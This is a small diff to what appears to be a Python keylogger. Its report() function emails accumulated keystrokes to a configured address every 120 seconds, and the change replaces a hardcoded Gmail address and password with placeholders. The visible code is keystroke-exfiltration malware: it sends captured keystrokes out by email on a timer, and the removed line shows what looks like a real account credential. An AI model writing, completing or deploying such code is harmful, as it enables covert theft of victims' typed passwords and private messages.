@@ -39,7 +39,7 @@ def send_mail(email, password, message):
 
 def report():
     global store_keys
-    send_mail("cyberking00c@gmail.com", "!!@@##$$%%", "\n\n" + store_keys)
+    send_mail("#enter your emai address", "#enter your password", "\n\n" + store_keys)
     # print(store_keys)
     store_keys = ''
     timer = threading.Timer(120,report)
